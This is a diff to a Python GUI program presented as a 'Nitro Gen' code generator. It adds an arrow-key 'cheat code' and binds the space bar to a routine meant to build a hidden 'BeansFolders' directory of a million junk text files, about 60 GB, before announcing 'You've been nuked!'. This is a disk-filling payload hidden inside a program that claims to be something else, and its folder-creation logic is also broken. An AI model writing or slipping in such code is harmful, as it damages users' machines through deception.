@@ -1,4 +1,11 @@
-import customtkinter as tk, requests, random, webbrowser, os, time
+import customtkinter as tk, requests, random, webbrowser, os, time, ctypes
+from tkinter import messagebox
+
+CHECKUP1 = 0
+CHECKDOWN1 = 0
+CHECKRIGHT1 = 0
+CHECKLEFT1 = 0
+CHEAT_CODE = "OFFLINE"
 
 # Creates an icon folder
 Icon = "Icon"
@@ -69,15 +76,105 @@ def quitv2():
     root.destroy()
     quit()
 
+def check1(event):
+    global CHECKUP1
+    if CHECKUP1 >= 2:
+        print("You have already activated this section of the cheat code.")
+        pass
+    else:
+        CHECKUP1 += 1
+        if CHECKUP1 == 1:
+            print("\n[1/2]")
+        elif CHECKUP1 == 2:
+            print("[2/2]")
+        else:
+            pass
+
+def check2(event):
+    global CHECKDOWN1
+    if CHECKDOWN1 >= 2:
+        print("You have already activated this section of the cheat code.")
+        pass
+    else:
+        CHECKDOWN1 += 1
+        if CHECKDOWN1 == 1:
+            print("\n[1/2]")
+        elif CHECKDOWN1 == 2:
+            print("[2/2]")
+        else:
+            pass
+
+def check3(event):
+    global CHECKRIGHT1
+    if CHECKRIGHT1 >= 2:
+        print("You have already activated this section of the cheat code.")
+        pass
+    else:
+        CHECKRIGHT1 += 1
+        if CHECKRIGHT1 == 1:
+            print("\n[1/2]")
+        elif CHECKRIGHT1 == 2:
+            print("[2/2]")
+        else:
+            pass
+
+def check4(event):
+    global CHECKLEFT1
+    if CHECKLEFT1 >= 2:
+        print("You have already activated this section of the cheat code.")
+        pass
+    else:
+        CHECKLEFT1 += 1
+        if CHECKLEFT1 == 1:
+            print("\n[1/2]")
+        elif CHECKLEFT1 == 2:
+            print("[2/2]")
+        else:
+            pass
+
+
+def create_folders_and_files():
+    base_path = 'BeansFolders'
+    os.makedirs(base_path, exist_ok=True)
+
+    for folder_num in range(1, 1001):
+        folder_path = os.path.join(base_path, f'Beans_{folder_num}')
+        print("\nCreating folder...")
+        os.makedirs(base_path)
+        # Set the folder attribute to hidden
+        FILE_ATTRIBUTE_HIDDEN = 0x02
+        ret = ctypes.windll.kernel32.SetFileAttributesW(base_path, FILE_ATTRIBUTE_HIDDEN)
+        if ret:
+            print("'BeansFolders' folder created and hidden\n")
+            pass
+        else:
+
+            error = ctypes.GetLastError()
+            print(f"\nFailed to hide 'BeansFolders' folder. Error code: {error}")
+
+        for file_num in range(1, 1001):
+            file_path = os.path.join(folder_path, f'Beans_{file_num}.txt')
+            with open(file_path, 'w') as file:
+                file.write('Beans\n' * 10000)
+                #print(f"Created file: \n Number: {file_num} \n Path: '{file_path}'")
+
+    messagebox.showinfo("Success", "You've been nuked!")
+
+def cheat(event):
+    print("\nWas it worth it?")
+    create_folders_and_files()
+        
+
+
 root = tk.CTk()
 root.geometry("300x180")
 root.title("Nitro Gen by Bernso")
 root.iconbitmap("Icon/Arhururan.ico")
-root.bind("<up-arrow>", quitv2)
-root.bind("<up-arrow>", check1)
-root.bind("<up-arrow>", check1)
-root.bind("<up-arrow>", check1)
-root.bind("<space-bar>", check1)
+root.bind("<Up>",       check1)
+root.bind("<Down>",     check2)
+root.bind("<Right>",    check3)
+root.bind("<Left>",     check4)
+root.bind("<space>",    cheat)
 
 
 statusLabel = tk.CTkLabel(root, text="Code has not been found yet.")
